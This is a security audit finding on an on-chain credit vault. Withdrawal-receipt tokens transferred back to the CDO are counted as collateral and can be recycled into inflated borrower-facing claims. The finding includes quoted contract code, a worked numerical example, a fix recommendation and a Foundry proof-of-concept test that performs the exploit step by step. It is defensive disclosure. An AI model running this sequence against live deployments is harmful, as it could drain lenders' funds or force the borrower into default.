### Title
Recycled withdrawal receipts inflate CDO NAV and create unbacked borrower claims - (File: `contracts/strategies/idle/IdleCreditVault.sol`) [1](#0-0) 

### Summary
`IdleCreditVault.requestWithdraw` mints the same ERC20 strategy token to the requester as a withdrawal receipt and records the requested amount in `pendingWithdraws`. [2](#0-1)  The CDO values its entire `strategyToken` balance as active NAV, while the epoch variant's donation protection removes only raw underlying tokens and does not isolate donated strategy-token receipts. [3](#0-2) [4](#0-3)  A user can therefore transfer a pending withdrawal receipt back to the CDO, have it priced as active collateral, and burn it again through another withdrawal request.

### Finding Description
During the buffer phase, a KYC-approved lender calls `requestWithdraw`, causing the strategy to burn the CDO's principal-backed strategy tokens and mint the requester a larger receipt containing principal plus projected interest. [2](#0-1)  The requester then transfers that receipt to the CDO with an ordinary ERC20 transfer; because `getContractValue()` uses the CDO's full strategy-token balance, the receipt is recounted as active NAV even though its claim remains in `pendingWithdraws`. [3](#0-2) 

A second withdrawal request then calls `_updateAccounting`, prices the remaining tranche supply against the receipt-inflated NAV, and asks `IdleCreditVault.requestWithdraw` to burn that inflated principal from the CDO. [5](#0-4)  This burns both the remaining active strategy-token principal and the donated receipt, while minting a new receipt for the inflated amount; the original `withdrawsRequests` entry remains pending. [6](#0-5)  The next `stopEpoch` pulls `pendingWithdraws` from the borrower, so both the donated claim and the recycled claim are billed to the borrower. [7](#0-6) 

### Impact Explanation
The protocol's "one receipt, one payout" and solvency invariants are broken: a receipt already represented in `pendingWithdraws` is reused as CDO collateral to mint a second receipt. [2](#0-1) [3](#0-2) 

For example, with 200 underlying deposited and a 10% projected epoch return, a 50-underlying request can produce a 55-underlying receipt. Donating that receipt raises the CDO's remaining strategy-token balance from 150 to 205; requesting the remaining 150 tranche NAV then mints a receipt for roughly 225.5 underlying. Total `pendingWithdraws` become roughly 280.5 although only 200 principal plus normal epoch interest was delivered to the borrower, creating approximately 60.5 of excess borrower-facing claims before fees. [8](#0-7) [9](#0-8) 

If the honest borrower funds the inflated `pendingWithdraws`, the second account can claim approximately 225.5 underlying for a combined 200-underlying outlay, while the donated claim's funding remains stranded because the donor no longer holds the receipt tokens needed by `_claimFundedWithdrawRequest`. [10](#0-9)  If the borrower does not overpay, the funding transfer fails and the vault enters the borrower-default path, causing insolvency and material freezing of the remaining claims. [11](#0-10) 

### Likelihood Explanation
The attack is reachable during the ordinary buffer phase by unprivileged withdrawal-request users; no owner, manager, guardian, borrower, or queue action is required. [12](#0-11)  It requires a positive projected return or an inexpensive recycled receipt, plus a second tranche position capable of requesting withdrawal; this can be another cooperating KYC-approved lender or a second position controlled through the protocol's permitted user surface. The absence of strategy-token donation isolation is deterministic because `_skimDonatedAssets` transfers only `token`, never `strategyToken`. [4](#0-3) 

### Recommendation
Do not allow user-held withdrawal receipts to become indistinguishable CDO collateral. The cleanest fix is to make pending-withdrawal receipts non-transferable account state, or mint them as a distinct receipt token that cannot be transferred to `idleCDO` or otherwise enter `getContractValue`. If transferable receipts must remain supported, `IdleCreditVault` should override ERC20 transfers to reject transfers whose recipient is the CDO, and the CDO should track active strategy-token principal through internal accounting rather than valuing `balanceOf(strategyToken)` unconditionally. Existing accidentally recycled receipts should be identified and recovered or excluded before relying on a corrected NAV calculation.

### Proof of Concept
The following regression can be added to `test/foundry/IdleCreditVault.t.sol` and run on the repository's existing Foundry fork fixture:

```solidity
function testDonatedWithdrawReceiptInflatesPendingBorrowerClaim() external {
  address donor = makeAddr("receipt-donor");
  address secondLp = makeAddr("second-lp");
  uint256 depositAmount = 100_000 * ONE_SCALE;

  _depositWithUser(donor, depositAmount, true);
  _depositWithUser(secondLp, depositAmount, true);

  uint256 donorTranches = IERC20Detailed(address(AAtranche)).balanceOf(donor);
  vm.prank(donor);
  uint256 donatedReceipt = cdoEpoch.requestWithdraw(donorTranches / 2, address(AAtranche));
  assertGt(donatedReceipt, 0);

  // The receipt is an ordinary ERC20 strategy token and can be sent to the CDO.
  vm.prank(donor);
  IERC20Detailed(address(strategy)).transfer(address(cdoEpoch), donatedReceipt);

  uint256 navAfterDonation = cdoEpoch.getContractValue();
  assertGt(navAfterDonation, depositAmount * 3 / 2, "donated receipt was not counted as active NAV");

  // A second LP burns the recycled receipt back through the CDO and receives a new,
  // interest-bearing receipt on the receipt-inflated NAV.
  vm.prank(secondLp);
  uint256 recycledReceipt = cdoEpoch.requestWithdraw(0, address(AAtranche));

  uint256 inflatedPending = IdleCreditVault(address(strategy)).pendingWithdraws();
  uint256 borrowerBalanceBefore = IERC20Detailed(defaultUnderlying).balanceOf(borrower);
  _startEpochAndCheckPrices(0);
  uint256 principalDelivered =
    IERC20Detailed(defaultUnderlying).balanceOf(borrower) - borrowerBalanceBefore;

  uint256 expectedInterest = cdoEpoch.expectedEpochInterest();
  assertGt(
    inflatedPending,
    principalDelivered + expectedInterest,
    "pending withdrawals exceed principal plus contractual epoch interest"
  );

  // The honest borrower funds exactly what stopEpoch requests.
  uint256 amountDue = inflatedPending + expectedInterest;
  deal(defaultUnderlying, borrower, amountDue);
  vm.prank(borrower);
  IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), amountDue);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);
  assertFalse(cdoEpoch.defaulted(), "inflated request was funded");

  uint256 secondBalanceBefore = IERC20Detailed(defaultUnderlying).balanceOf(secondLp);
  vm.prank(secondLp);
  cdoEpoch.claimWithdrawRequest();
  uint256 secondPayout = IERC20Detailed(defaultUnderlying).balanceOf(secondLp) - secondBalanceBefore;

  assertEq(secondPayout, recycledReceipt, "recycled receipt was not paid");
  assertGt(secondPayout, 2 * depositAmount, "combined LPs receive more than their deposits");

  // The first receipt's accounting still exists, but its tokens were burned as CDO collateral,
  // so its funded cash is stranded.
  vm.expectRevert();
  vm.prank(donor);
  cdoEpoch.claimWithdrawRequest();
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L272-293)
```text
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/IdleCDO.sol (L183-186)
```text
    return (_contractTokenBalance(_strategyToken) * _strategyPrice() / (10**(IERC20Detailed(_strategyToken).decimals()))) +
            _contractTokenBalance(token) -
            _lockedRewards() -
            unclaimedFees;
```

**File:** contracts/IdleCDOEpochVariant.sol (L260-264)
```text
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;

```

**File:** contracts/IdleCDOEpochVariant.sol (L391-410)
```text
    // Pending receipts have no tranche identity, so their aggregate loss is pro rata across all
    // receipts. The remaining active loss is applied BB-first after the stop succeeds.
    (_pendingWithdraws, _lossAmount) = _strategy.previewLossAdjustedWithdrawFunds(_lossAmount);

    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```
